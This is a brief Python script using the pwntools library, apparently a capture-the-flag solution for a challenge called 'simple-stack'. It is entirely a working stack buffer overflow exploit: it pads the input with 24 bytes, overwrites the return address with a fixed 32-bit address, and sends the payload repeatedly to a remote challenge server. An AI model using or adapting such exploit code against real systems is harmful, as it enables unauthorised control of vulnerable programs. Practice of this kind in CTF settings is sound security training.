from pwn import *

#binary="./simple-stack"
for i in range(10):
        payload=b"A"*24
        payload+=p32(0x08049216)
        r=remote("0.cloud.chals.io",24579)
        print(r.recv())
        r.sendline(payload)
        print(r.recv())